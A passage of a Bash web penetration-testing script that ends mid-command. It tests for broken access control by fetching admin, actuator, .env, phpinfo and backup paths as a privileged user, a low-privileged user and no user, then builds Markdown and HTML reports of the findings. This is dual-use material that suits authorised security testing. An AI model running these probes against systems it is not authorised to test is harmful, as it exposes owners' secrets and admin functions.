# Compares response against high-priv baseline to reduce false positives.
phase_bac() {
    log_phase "Phase 15b: Broken Access Control (BAC) Testing"

    if [[ "$AUTH_MODE" == "none" && "$AUTH2_MODE" == "none" ]]; then
        log_warn "No auth configured â€” skipping BAC testing (requires --auth-user or --auth-user2)"
        return
    fi

    local bac_out="$VULN_DIR/bac/findings.txt"
    > "$bac_out"

    # â”€â”€ Collect privileged/admin endpoint candidates â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    local bac_candidates="$VULN_DIR/bac/candidates.txt"
    > "$bac_candidates"

    # 1. From ALL_URLS â€” paths that look privileged
    if [[ -s "$ALL_URLS" ]]; then
        grep -iE "/(admin|administrator|manage[r]?|management|dashboard|panel|control|console|superuser|root|privileged|internal|staff|operator|config|settings|setup|system|monitoring|metrics|debug|actuator|health|api/admin|api/v[0-9]+/admin|users/[0-9]|accounts/[0-9]|orders/[0-9])" \
            "$ALL_URLS" 2>/dev/null | sort -u >> "$bac_candidates"
    fi

    # 2. From content discovery results (ffuf JSON output â€” 200 OK paths)
    find "$OUTDIR/recon/wordlists/" -name "ffuf_*.json" 2>/dev/null | while IFS= read -r f; do
        python3 -c "
import json
try:
    for r in json.load(open('$f')).get('results',[]):
        if r.get('status',0)==200 and r.get('url',''):
            print(r['url'])
except: pass
" 2>/dev/null
    done | grep -iE "admin|manage|dashboard|panel|internal|config|debug|actuator" \
        | sort -u >> "$bac_candidates" || true

    # 3. From nuclei findings (URLs in critical/high findings)
    if [[ -s "$VULN_DIR/nuclei/all_findings.jsonl" ]]; then
        python3 -c "
import json
for line in open('$VULN_DIR/nuclei/all_findings.jsonl'):
    try:
        d = json.loads(line)
        u = d.get('matched-at','')
        sev = d.get('info',{}).get('severity','').lower()
        if u and sev in ('critical','high','medium'): print(u)
    except: pass
" 2>/dev/null >> "$bac_candidates" || true
    fi

    # 4. Static list of common admin/API paths against all live hosts
    local -a admin_paths=(
        "/admin" "/admin/" "/admin/login" "/admin/dashboard" "/admin/users" "/admin/settings"
        "/administrator" "/administrator/"
        "/api/admin" "/api/v1/admin" "/api/v2/admin" "/api/v1/users" "/api/v2/users"
        "/api/v1/user/1" "/api/v1/accounts/1" "/api/v1/orders/1"
        "/dashboard" "/manage" "/management" "/control" "/controlpanel" "/panel"
        "/superadmin" "/staff" "/internal" "/private"
        "/config" "/settings" "/setup" "/system"
        "/monitoring" "/metrics" "/actuator" "/actuator/env" "/actuator/beans"
        "/debug" "/health" "/server-status" "/server-info"
        "/api/users" "/api/accounts" "/api/orders" "/api/invoices"
        "/.env" "/backup" "/phpinfo.php" "/info.php"
    )
    while IFS= read -r base; do
        for path in "${admin_paths[@]}"; do
            echo "${base%/}${path}"
        done
    done < <(head -10 "$LIVE_HOSTS") | sort -u >> "$bac_candidates"

    sort -u "$bac_candidates" -o "$bac_candidates"
    local cand_count; cand_count=$(wc -l < "$bac_candidates" 2>/dev/null || echo 0)
    log_info "BAC candidates: ${cand_count} privileged endpoints to test"
    [[ "$cand_count" -eq 0 ]] && { log_info "No BAC candidates found."; return; }

    local has_user1=false; [[ "$AUTH_MODE"  != "none" ]] && has_user1=true
    local has_user2=false; [[ "$AUTH2_MODE" != "none" ]] && has_user2=true

    log_info "Roles: ${AUTH_ROLE1}(${AUTH_MODE}) vs ${AUTH_ROLE2}(${AUTH2_MODE}) vs unauth"

    local bac_count=0 tested=0

    while IFS= read -r url; do
        [[ $tested -ge 400 ]] && break
        ((tested++))
        waf_sleep

        # â”€â”€ High-priv baseline â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        local hp_code="" hp_len=0
        if $has_user1; then
            local hp_body; hp_body=$(curl -s --connect-timeout 10 --max-time 15 \
                ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} "$url" 2>/dev/null)
            hp_code=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 8 \
                ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} "$url" 2>/dev/null)
            hp_len="${#hp_body}"
        fi

        # â”€â”€ Test: unauthenticated access â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        waf_sleep
        local ua_body; ua_body=$(curl -s --connect-timeout 10 --max-time 15 "$url" 2>/dev/null)
        local ua_code; ua_code=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 8 "$url" 2>/dev/null)
        local ua_len="${#ua_body}"

        if [[ "$ua_code" =~ ^2 ]] && [[ "$ua_len" -gt 100 ]]; then
            if $has_user1 && [[ "$hp_code" =~ ^2 ]]; then
                local diff=$(( ua_len > hp_len ? ua_len - hp_len : hp_len - ua_len ))
                local sim=$(( hp_len > 0 ? 100 - diff * 100 / hp_len : 0 ))
                if [[ $sim -ge 60 ]]; then
                    printf "[BAC][UNAUTH][sim=%d%%][%s:200â†’unauth:200] %s\n" \
                        "$sim" "$AUTH_ROLE1" "$url" >> "$bac_out"
                    log_finding "BAC â€” unauthenticated access (${sim}%% match vs ${AUTH_ROLE1}): $url"
                    ((bac_count++))
                fi
            elif ! $has_user1; then
                printf "[BAC][UNAUTH][%s] %s\n" "$ua_code" "$url" >> "$bac_out"
                log_finding "BAC â€” unauthenticated access to privileged path: $url (${ua_code})"
                ((bac_count++))
            fi
        fi

        # â”€â”€ Test: low-priv user (vertical privilege escalation) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        if $has_user2; then
            waf_sleep
            local lp_body; lp_body=$(curl -s --connect-timeout 10 --max-time 15 \
                ${AUTH2_CURL_OPTS[@]+"${AUTH2_CURL_OPTS[@]}"} "$url" 2>/dev/null)
            local lp_code; lp_code=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 8 \
                ${AUTH2_CURL_OPTS[@]+"${AUTH2_CURL_OPTS[@]}"} "$url" 2>/dev/null)
            local lp_len="${#lp_body}"

            # Flag only when low-priv gets 2xx on a resource that high-priv also 2xxs
            if [[ "$lp_code" =~ ^2 ]] && [[ "$lp_len" -gt 100 ]]; then
                if $has_user1 && [[ "$hp_code" =~ ^2 ]]; then
                    local diff=$(( lp_len > hp_len ? lp_len - hp_len : hp_len - lp_len ))
                    local sim=$(( hp_len > 0 ? 100 - diff * 100 / hp_len : 0 ))
                    if [[ $sim -ge 60 ]]; then
                        printf "[BAC][VERTICAL_PRIVESC][sim=%d%%][%sâ†’%s][%s:200â†’%s:200] %s\n" \
                            "$sim" "$AUTH_ROLE2" "$AUTH_ROLE1" "$AUTH_ROLE1" "$AUTH_ROLE2" "$url" >> "$bac_out"
                        log_finding "BAC â€” vertical privesc (${sim}%% match): ${AUTH_ROLE2} can access ${AUTH_ROLE1} endpoint â†’ $url"
                        ((bac_count++))
                    fi
                elif ! $has_user1; then
                    printf "[BAC][LOWPRIV_ADMIN][%s] %s\n" "$lp_code" "$url" >> "$bac_out"
                    log_finding "BAC â€” ${AUTH_ROLE2} accessed admin endpoint (${lp_code}): $url"
                    ((bac_count++))
                fi
            fi
        fi

    done < "$bac_candidates"

    log_ok "BAC testing: ${tested} endpoints, ${bac_count} findings â†’ $bac_out"
    [[ $bac_count -gt 0 ]] && \
        notify_all "ðŸš¨ Broken Access Control on \`${TARGET}\`: ${bac_count} findings"
}

# â”€â”€â”€ Phase 15: Screenshots â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
phase_screenshots() {
    if $SKIP_SCREENSHOTS; then
        log_warn "Skipping screenshots (--skip-screenshots)"
        return
    fi

    log_phase "Phase 15: Screenshots"

    [[ ! -s "$LIVE_HOSTS" ]] && { log_warn "No live hosts for screenshots."; return; }

    if require_tool gowitness; then
        log_info "Capturing screenshots with gowitness..."
        gowitness scan file \
            -f "$LIVE_HOSTS" \
            --screenshot-path "$SHOTS_DIR" \
            --timeout 20 \
            2>/dev/null || true
        # Generate report
        gowitness report generate \
            --screenshot-path "$SHOTS_DIR" \
            -o "$SHOTS_DIR/index.html" \
            2>/dev/null || true
        local shot_count; shot_count=$(find "$SHOTS_DIR" -name "*.png" 2>/dev/null | wc -l)
        log_ok "Screenshots captured: ${shot_count} â†’ $SHOTS_DIR/index.html"
    else
        log_warn "gowitness not found. Screenshots skipped."
    fi
}

# â”€â”€â”€ Phase 16: Report Generation â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
phase_report() {
    log_phase "Phase 16: Generating Report"

    local report_file="$REPORT_DIR/summary.md"
    local end_time; end_time=$(date +%s)
    local duration=$(( end_time - START_TIME ))
    local duration_fmt; duration_fmt=$(printf "%dh %dm %ds" $((duration/3600)) $((duration%3600/60)) $((duration%60)))

    # Count findings
    local total_subs; total_subs=$(wc -l < "$ALL_SUBS" 2>/dev/null || echo 0)
    local resolved_subs; resolved_subs=$(wc -l < "$RESOLVED_SUBS" 2>/dev/null || echo 0)
    local live_hosts; live_hosts=$(wc -l < "$LIVE_HOSTS" 2>/dev/null || echo 0)
    local total_urls; total_urls=$(wc -l < "$ALL_URLS" 2>/dev/null || echo 0)
    local nuclei_crit; nuclei_crit=$(wc -l < "$VULN_DIR/nuclei/critical_high.jsonl" 2>/dev/null || echo 0)
    local nuclei_total; nuclei_total=$(wc -l < "$VULN_DIR/nuclei/all_findings.jsonl" 2>/dev/null || echo 0)

    local auth_summary="none (unauthenticated)"
    [[ "$AUTH_MODE" != "none" ]] && auth_summary="$AUTH_MODE"
    [[ "$AUTH_MODE" == "auto" ]] && [[ -f "$OUTDIR/auth_creds_found.txt" ]] && \
        auth_summary="auto (default creds: $(cat "$OUTDIR/auth_creds_found.txt" 2>/dev/null))"

    local waf_summary="not detected"
    $WAF_DETECTED && waf_summary="${WAF_NAME} (rate=${RATE_LIMIT} req/s, delay=${WAF_DELAY}s, encoding=ON)"

    cat > "$report_file" << EOF
# Web Pentest Scan Report
**Target:** $TARGET
**Date:** $(date '+%Y-%m-%d %H:%M:%S')
**Duration:** $duration_fmt
**Auth Mode:** $auth_summary
**WAF:** $waf_summary
**Output:** $OUTDIR

---

## Recon Summary

| Item | Count |
|------|-------|
| Total Subdomains | $total_subs |
| Resolved Subdomains | $resolved_subs |
| Live Web Hosts | $live_hosts |
| Total URLs Collected | $total_urls |
| JS Files | $(wc -l < "$JS_FILES" 2>/dev/null || echo 0) |

---

## Vulnerability Summary

| Category | Count |
|----------|-------|
| Nuclei Critical/High | $nuclei_crit |
| Nuclei Total | $nuclei_total |
| XSS (Dalfox) | $(wc -l < "$VULN_DIR/xss/dalfox_findings.txt" 2>/dev/null || echo 0) |
| XSS (Reflected) | $(wc -l < "$VULN_DIR/xss/reflected.txt" 2>/dev/null || echo 0) |
| SQLi Candidates | $(wc -l < "$VULN_DIR/sqli/sqli_candidates.txt" 2>/dev/null || echo 0) |
| Open Redirects | $(wc -l < "$VULN_DIR/ssrf/open_redirects.txt" 2>/dev/null || echo 0) |
| CORS Issues | $(wc -l < "$VULN_DIR/cors/cors_findings.txt" 2>/dev/null || echo 0) |
| Subdomain Takeover | $(wc -l < "$VULN_DIR/takeover/dangling_cnames.txt" 2>/dev/null || echo 0) |
| Secrets in JS | $(wc -l < "$VULN_DIR/secrets/js_secrets.txt" 2>/dev/null || echo 0) |
| 403 Bypasses (confirmed) | $(grep -cE "BYPASS|NOMORE" "$VULN_DIR/403bypass/bypassed.txt" 2>/dev/null || echo 0) |
| Sensitive Files | $(wc -l < "$HTTP_DIR/sensitive_files.txt" 2>/dev/null || echo 0) |
| SQLi Confirmed | $(wc -l < "$VULN_DIR/sqli/error_based_confirmed.txt" 2>/dev/null || echo 0) |
| SQLi Time-based | $(wc -l < "$VULN_DIR/sqli/timebased_confirmed.txt" 2>/dev/null || echo 0) |
| CORS Exploitable | $(grep -c "EXPLOITABLE" "$VULN_DIR/cors/cors_findings.txt" 2>/dev/null || echo 0) |
| IDOR Findings | $(wc -l < "$VULN_DIR/idor/findings.txt" 2>/dev/null || echo 0) |
| BAC Findings | $(wc -l < "$VULN_DIR/bac/findings.txt" 2>/dev/null || echo 0) |
| SSTI Findings | $(wc -l < "$VULN_DIR/ssti/findings.txt" 2>/dev/null || echo 0) |
| XXE Findings | $(wc -l < "$VULN_DIR/xxe/findings.txt" 2>/dev/null || echo 0) |
| JWT Vulnerabilities | $(wc -l < "$VULN_DIR/jwt/findings.txt" 2>/dev/null || echo 0) |
| GraphQL Issues | $(wc -l < "$VULN_DIR/graphql/findings.txt" 2>/dev/null || echo 0) |
| OAuth/OIDC Issues | $(wc -l < "$VULN_DIR/oauth/findings.txt" 2>/dev/null || echo 0) |

---

## Critical Findings
EOF

    # Append nuclei findings grouped by severity
    if [[ -s "$VULN_DIR/nuclei/all_findings.jsonl" ]]; then
        python3 -c "
import json, sys
from collections import defaultdict

severity_order = ['critical', 'high', 'medium', 'low', 'info']
buckets = defaultdict(list)

for line in open('$VULN_DIR/nuclei/all_findings.jsonl'):
    try:
        d = json.loads(line)
        sev = d.get('info', {}).get('severity', 'info').lower()
        name = d.get('info', {}).get('name', '?')
        host = d.get('matched-at') or d.get('host', '?')
        buckets[sev].append(f'[{sev.upper()}] {name} - {host}')
    except:
        pass

for sev in severity_order:
    if buckets[sev]:
        print(f'\n### Nuclei â€” {sev.capitalize()} ({len(buckets[sev])})\n')
        print('\`\`\`')
        for item in buckets[sev]:
            print(item)
        print('\`\`\`')
" 2>/dev/null >> "$report_file" || true
    fi

    # Infra findings
    if [[ -s "$OUTDIR/infra/tls_findings.jsonl" ]] || [[ -s "$OUTDIR/infra/header_findings.jsonl" ]] || [[ -s "$OUTDIR/infra/dns_hygiene.txt" ]]; then
        echo -e "\n---\n\n## Infrastructure Findings\n" >> "$report_file"

        if [[ -s "$OUTDIR/infra/tls_findings.jsonl" ]]; then
            echo -e "### TLS/SSL ($(wc -l < "$OUTDIR/infra/tls_findings.jsonl"))\n\`\`\`" >> "$report_file"
            python3 -c "
import json, sys
for line in open('$OUTDIR/infra/tls_findings.jsonl'):
    try:
        d = json.loads(line)
        print(f\"[{d.get('info',{}).get('severity','?').upper()}] {d.get('info',{}).get('name','?')} - {d.get('matched-at') or d.get('host','?')}\")
    except: pass
" 2>/dev/null >> "$report_file" || true
            echo '```' >> "$report_file"
        fi

        if [[ -s "$OUTDIR/infra/header_findings.jsonl" ]]; then
            echo -e "\n### Security Headers ($(wc -l < "$OUTDIR/infra/header_findings.jsonl"))\n\`\`\`" >> "$report_file"
            python3 -c "
import json, sys
for line in open('$OUTDIR/infra/header_findings.jsonl'):
    try:
        d = json.loads(line)
        print(f\"[{d.get('info',{}).get('severity','?').upper()}] {d.get('info',{}).get('name','?')} - {d.get('matched-at') or d.get('host','?')}\")
    except: pass
" 2>/dev/null >> "$report_file" || true
            echo '```' >> "$report_file"
        fi

        if [[ -s "$OUTDIR/infra/dns_hygiene.txt" ]]; then
            echo -e "\n### DNS Hygiene\n\`\`\`" >> "$report_file"
            cat "$OUTDIR/infra/dns_hygiene.txt" >> "$report_file"
            echo '```' >> "$report_file"
        fi
    fi

    # File listing
    cat >> "$report_file" << EOF

---

## Output Files

| File | Description |
|------|-------------|
| \`recon/subdomains/all_subs.txt\` | All discovered subdomains |
| \`recon/subdomains/resolved_subs.txt\` | DNS-resolved subdomains |
| \`recon/http/live_hosts.txt\` | Live web hosts |
| \`recon/http/httpx_full.txt\` | Full httpx output (titles, techs, status) |
| \`recon/urls/all_urls.txt\` | All collected URLs |
| \`recon/js/js_files.txt\` | JavaScript files |
| \`infra/waf.txt\` | WAF detection report |
| \`infra/waf_hosts.txt\` | Per-host WAF indicators |
| \`infra/tls_findings.jsonl\` | TLS/SSL issues |
| \`infra/header_findings.jsonl\` | Missing/weak security headers |
| \`infra/dns_hygiene.txt\` | SPF / DMARC / CAA / zone transfer |
| \`infra/versions.txt\` | Version fingerprints |
| \`vulns/nuclei/all_findings.jsonl\` | All Nuclei findings |
| \`vulns/nuclei/critical_high.jsonl\` | Critical & High findings |
| \`vulns/xss/dalfox_findings.txt\` | XSS findings (Dalfox) |
| \`vulns/sqli/sqli_candidates.txt\` | SQLi candidates |
| \`vulns/sqli/error_based_confirmed.txt\` | Confirmed error-based SQLi |
| \`vulns/sqli/timebased_confirmed.txt\` | Confirmed time-based blind SQLi |
| \`vulns/cors/cors_findings.txt\` | CORS findings |
| \`vulns/takeover/dangling_cnames.txt\` | Subdomain takeover candidates |
| \`vulns/secrets/js_secrets.txt\` | Secrets found in JS |
| \`vulns/403bypass/bypassed.txt\` | 403 bypass results |
| \`vulns/idor/findings.txt\` | IDOR findings (horizontal + unauth + enum) |
| \`vulns/idor/candidates.txt\` | URLs with object IDs tested |
| \`vulns/bac/findings.txt\` | Broken Access Control findings |
| \`vulns/bac/candidates.txt\` | Admin/privileged endpoints tested |
| \`vulns/ssti/findings.txt\` | SSTI findings |
| \`vulns/xxe/findings.txt\` | XXE findings |
| \`vulns/jwt/findings.txt\` | JWT vulnerability findings |
| \`vulns/graphql/findings.txt\` | GraphQL issue findings |
| \`vulns/graphql/endpoints.txt\` | Discovered GraphQL endpoints |
| \`vulns/oauth/findings.txt\` | OAuth/OIDC vulnerability findings |
| \`auth_jwt_claims.json\` | Decoded JWT claims (user ID, role) |
| \`LIVE_FINDINGS.txt\` | Real-time findings log (appended during scan) |
| \`screenshots/\` | Screenshots (open index.html) |

---
*Generated by webpwn.sh â€” Web Application Penetration Testing Framework v3.0*
EOF

    log_ok "Report saved: ${BOLD}${report_file}${RESET}"

    # â”€â”€ HTML Report â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    local html_file="$REPORT_DIR/report.html"
    python3 -c "
import json, html, sys, os
from collections import defaultdict

target = '$TARGET'
date_str = '$(date "+%Y-%m-%d %H:%M:%S")'
duration = '$duration_fmt'
auth_s = '$auth_summary'
waf_s = '$waf_summary'
outdir = '$OUTDIR'
vuln_dir = '$VULN_DIR'

def read_lines(f):
    try: return [l.rstrip() for l in open(f) if l.strip()]
    except: return []

def count_file(f):
    try: return sum(1 for l in open(f) if l.strip())
    except: return 0

findings = {
    'Nuclei Critical/High': count_file(vuln_dir+'/nuclei/critical_high.jsonl'),
    'Nuclei Total': count_file(vuln_dir+'/nuclei/all_findings.jsonl'),
    'XSS (Dalfox)': count_file(vuln_dir+'/xss/dalfox_findings.txt'),
    'SQLi Confirmed': count_file(vuln_dir+'/sqli/error_based_confirmed.txt'),
    'SQLi Time-based': count_file(vuln_dir+'/sqli/timebased_confirmed.txt'),
    'SSRF/Open Redirects': count_file(vuln_dir+'/ssrf/open_redirects.txt'),
    'CORS Issues': count_file(vuln_dir+'/cors/cors_findings.txt'),
    'Secrets in JS': count_file(vuln_dir+'/secrets/js_secrets.txt'),
    '403 Bypasses': count_file(vuln_dir+'/403bypass/bypassed.txt'),
    'IDOR': count_file(vuln_dir+'/idor/findings.txt'),
    'BAC': count_file(vuln_dir+'/bac/findings.txt'),
    'SSTI': count_file(vuln_dir+'/ssti/findings.txt'),
    'XXE': count_file(vuln_dir+'/xxe/findings.txt'),
    'JWT Vulns': count_file(vuln_dir+'/jwt/findings.txt'),
    'GraphQL': count_file(vuln_dir+'/graphql/findings.txt'),
    'OAuth/OIDC': count_file(vuln_dir+'/oauth/findings.txt'),
    'Subdomain Takeover': count_file(vuln_dir+'/takeover/dangling_cnames.txt'),
}

# Parse nuclei findings
nuclei_buckets = defaultdict(list)
for line in read_lines(vuln_dir+'/nuclei/all_findings.jsonl'):
    try:
        d = json.loads(line)
        sev = d.get('info',{}).get('severity','info').lower()
        name = d.get('info',{}).get('name','?')
        matched = d.get('matched-at') or d.get('host','?')
        nuclei_buckets[sev].append((name, matched))
    except: pass

live_findings = read_lines('$LIVE_FINDINGS_LOG')

sev_colors = {'critical':'#c0392b','high':'#e67e22','medium':'#f1c40f','low':'#2ecc71','info':'#3498db'}

rows = ''.join(
    f'<tr><td>{k}</td><td class=\"{\"crit\" if v > 0 and k in [\"Nuclei Critical/High\",\"SQLi Confirmed\",\"JWT Vulns\",\"IDOR\",\"BAC\",\"SSTI\",\"XXE\"] else \"ok\" if v == 0 else \"warn\"}\">{v}</td></tr>'
    for k,v in findings.items()
)

nuclei_html = ''
for sev in ['critical','high','medium','low','info']:
    items = nuclei_buckets.get(sev, [])
    if items:
        col = sev_colors.get(sev,'#999')
        nuclei_html += f'<h3 style=\"color:{col}\">{sev.upper()} ({len(items)})</h3><ul>'
        for name,matched in items[:100]:
            nuclei_html += f'<li><b>{html.escape(name)}</b> â€” {html.escape(matched)}</li>'
        nuclei_html += '</ul>'

live_html = ''.join(f'<div class=\"finding\">{html.escape(l)}</div>' for l in live_findings[-200:])

page = f'''<!DOCTYPE html>
<html lang=\"en\"><head><meta charset=\"UTF-8\">
<title>WebPwn Report â€” {html.escape(target)}</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:\"Segoe UI\",Arial,sans-serif;background:#0d1117;color:#c9d1d9;padding:20px}}
h1{{color:#58a6ff;margin-bottom:8px}}h2{{color:#79c0ff;margin:20px 0 8px}}h3{{margin:12px 0 6px}}
.meta{{color:#8b949e;font-size:0.9em;margin-bottom:20px}}
table{{border-collapse:collapse;width:100%;max-width:800px;margin-bottom:20px}}
th,td{{border:1px solid #30363d;padding:8px 12px;text-align:left}}
th{{background:#161b22;color:#58a6ff}}
tr:nth-child(even){{background:#161b22}}
.crit{{color:#ff7b72;font-weight:bold}}
.warn{{color:#ffa657}}
.ok{{color:#56d364}}
.finding{{font-family:monospace;font-size:0.85em;padding:3px 6px;border-left:3px solid #f1c40f;margin:2px 0;background:#161b22}}
.box{{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:16px;margin-bottom:16px}}
a{{color:#58a6ff}}
</style></head><body>
<h1>WebPwn Scan Report</h1>
<div class=\"meta\">
  <b>Target:</b> {html.escape(target)} &nbsp;|&nbsp;
  <b>Date:</b> {date_str} &nbsp;|&nbsp;
  <b>Duration:</b> {duration} &nbsp;|&nbsp;
  <b>Auth:</b> {html.escape(auth_s)} &nbsp;|&nbsp;
  <b>WAF:</b> {html.escape(waf_s)}
</div>
<div class=\"box\">
<h2>Vulnerability Summary</h2>
<table><tr><th>Category</th><th>Count</th></tr>{rows}</table>
</div>
<div class=\"box\">
<h2>Nuclei Findings</h2>
{nuclei_html if nuclei_html else \"<p style='color:#8b949e'>No Nuclei findings.</p>\"}
</div>
<div class=\"box\">
<h2>Live Findings Log</h2>
{live_html if live_html else \"<p style='color:#8b949e'>No findings logged.</p>\"}
</div>
<div class=\"box\">
<h2>Output Directory</h2>
<p><code>{html.escape(outdir)}</code></p>
<p style=\"margin-top:8px\">Also see: <a href=\"summary.md\">summary.md</a></p>
</div>
<p style=\"color:#8b949e;font-size:0.8em;margin-top:20px\">Generated by webpwn.sh â€” Web Application Penetration Testing Framework v3.0</p>
</body></html>'''
with open('$html_file','w') as f: f.write(page)
print('HTML report saved')
" 2>/dev/null && log_ok "HTML report: ${BOLD}${html_file}${RESET}" || true

    echo
    echo -e "${BOLD}${GREEN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• SCAN COMPLETE â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${RESET}"
    echo -e " Target:     ${BOLD}$TARGET${RESET}"
    echo -e " Duration:   $duration_fmt"
    echo -e " Subdomains: $total_subs (resolved: $resolved_subs)"
    echo -e " Live hosts: $live_hosts"
    echo -e " Total URLs: $total_urls"
    echo -e " Findings:   nuclei=${nuclei_total}, critical/high=${nuclei_crit}"
    echo -e " JWT vulns:  $(wc -l < "$VULN_DIR/jwt/findings.txt" 2>/dev/null || echo 0)"
    echo -e " OAuth/OIDC: $(wc -l < "$VULN_DIR/oauth/findings.txt" 2>/dev/null || echo 0)"
    echo -e " Live log:   ${CYAN}$LIVE_FINDINGS_LOG${RESET}"
    echo -e " Output:     ${CYAN}$OUTDIR${RESET}"
    echo -e " Report MD:  ${CYAN}$report_file${RESET}"
    echo -e " Report HTML:${CYAN}$html_file${RESET}"
    echo -e "${BOLD}${GREEN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${RESET}"

    # Notify
    if $NOTIFY_ENABLED && require_tool notify; then
        echo "[$TARGET] Scan done. Findings: $nuclei_total total, $nuclei_crit critical/high. Output: $OUTDIR" | \
            notify -silent 2>/dev/null || true
    fi
}

# â”€â”€â”€ Phase wrapper: track name + Telegram poll + stop check â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
run_phase() {
    local name="$1"; shift
    CURRENT_PHASE="$name"
    state_set "PHASE" "$name"
    case "$name" in
        waf) : ;;
        *)
            if $RESUME && phase_completed "$name"; then
                log_ok "Resume: phase '${name}' already completed â€” skipping"
                return 0
            fi
            ;;
    esac
    $TG_STOP_REQUESTED && { log_warn "Scan stopped via Telegram (/stop). Skipping ${name}."; return; }
    tg_poll_commands 2>/dev/null || true
    "$@"
    local rc=$?
    state_set "AUTH1" "$AUTH_MODE"
    state_set "AUTH2" "$AUTH2_MODE"
    state_set "WAF" "$WAF_NAME"
    if [[ "$rc" -eq 0 ]]; then
        mark_phase_completed "$name"
    else
        log_warn "Phase '${name}' exited with status ${rc} â€” checkpoint not written"
    fi
    tg_poll_commands 2>/dev/null || true
    return "$rc"
}

# â”€â”€â”€ Main Execution â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
main() {
    # Capture original args before parse_args consumes them (needed for tmux re-launch)
    ORIG_ARGS=("$@")

    clear
    banner
    echo
    parse_args "$@"
    load_notify_config

    # â”€â”€ Load API keys & write provider configs for all tools â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    _load_api_keys

    # â”€â”€ Auto-tmux: always run in tmux unless already inside one or --no-tmux â”€â”€
    # This protects against web console / SSH disconnects killing the scan.
    # To disable: pass --no-tmux or set NO_TMUX=true
    if ! $NO_TMUX && ! $TG_BOT_MODE; then
        # Are we already inside a tmux session?
        if [[ -z "${TMUX:-}" ]]; then
            # Build relaunch args (strip --background if present; add --no-tmux to avoid loop)
            local relaunch_args=()
            for arg in "${ORIG_ARGS[@]}"; do
                [[ "$arg" == "--background" ]] && continue
                relaunch_args+=("$arg")
            done
            relaunch_args+=("--no-tmux")

            local session_name="webpwn_${TARGET//./_}"
            if command -v tmux &>/dev/null; then
                # Kill stale session if it exists and is not running
                tmux has-session -t "$session_name" 2>/dev/null && \
                    tmux kill-session -t "$session_name" 2>/dev/null || true
                tmux new-session -d -s "$session_name" \
                    "bash $(realpath "$0") ${relaunch_args[*]}; echo; echo '=== Scan complete. Press Enter to exit. ==='; read"
                echo -e "${GREEN}[OK]${RESET}    Auto-launched in tmux session: ${BOLD}${session_name}${RESET}"
                echo -e "${CYAN}[INFO]${RESET}  Attach: ${BOLD}tmux attach -t ${session_name}${RESET}"
                echo -e "${CYAN}[INFO]${RESET}  The scan runs safely in background â€” reconnect at any time."
            elif command -v screen &>/dev/null; then
                screen -dmS "$session_name" bash -c "bash $(realpath "$0") ${relaunch_args[*]}"
                echo -e "${GREEN}[OK]${RESET}    Auto-launched in screen: ${BOLD}screen -r ${session_name}${RESET}"
            else
                local logfile; logfile="/tmp/webpwn_${TARGET//./_}_$(date +%Y%m%d_%H%M%S).log"
                nohup bash "$(realpath "$0")" "${relaunch_args[@]}" > "$logfile" 2>&1 &
                echo -e "${GREEN}[OK]${RESET}    tmux/screen not found â€” nohup PID: $! | Log: ${logfile}"
            fi
            exit 0
        fi
    fi

    # â”€â”€ Legacy --background flag still works â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if $BACKGROUND && [[ -z "${TMUX:-}" ]]; then
        local relaunch_args=()
        for arg in "${ORIG_ARGS[@]}"; do
            [[ "$arg" == "--background" ]] && continue
            relaunch_args+=("$arg")
        done
        relaunch_args+=("--no-tmux")
        local session_name="webpwn_${TARGET//./_}"
        if command -v tmux &>/dev/null; then
            tmux has-session -t "$session_name" 2>/dev/null && tmux kill-session -t "$session_name" 2>/dev/null || true
            tmux new-session -d -s "$session_name" \
